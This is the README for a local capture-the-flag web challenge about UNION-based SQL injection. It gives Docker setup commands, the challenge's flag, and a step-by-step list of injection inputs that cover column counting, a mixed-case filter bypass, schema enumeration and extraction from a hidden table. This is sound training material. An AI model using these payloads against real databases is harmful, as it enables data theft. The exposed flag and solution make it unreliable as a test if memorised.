#
A UNION-based SQL injection + case-sensitive filter bypass + hidden table discovery

**Flag:** `PrisonCTF{br0ke_0ut_of_c3ll_bl0ck_2}`

---

## Docker 


```bash
docker compose up -d
```

Then open **http://localhost:8080**

To rebuild after changes:
```bash
docker compose up -d --build
```

To stop and clean up:
```bash
docker compose down
```

To reset the database (wipe and re-seed):
```bash
docker compose down -v
docker exec irongate-inmate-registry-php rm -f /var/www/html/ctf.db
docker compose restart

```

On first page load, `index.php` auto-creates `ctf.db` in the same folder and
seeds it with inmates and the hidden flag table. Delete `ctf.db` to reset.


## Testing Locally

`curl http://lcoalhost:8080`

 `Scofield` 
 `'` 
 `' ORDER BY 6--` 
 `' ORDER BY 5--` 
 `' UNION SELECT 1,2,3,4,5--` 
 `' uNiOn sElEcT 1,2,3,4,5--` 
 `' uNiOn sElEcT name,type,sql,NULL,NULL FROM sqlite_master--` 
 `' uNiOn sElEcT flag,hint,NULL,NULL,NULL FROM esc4pe_pl4n--` 

---

## Project Files

`index.php` -> The main challenge file
`Dockerfile` --> PHP 8.2 + Apache + pdo_sqlite |=
`docker-compose.yml` --> One-command Docker deployment 


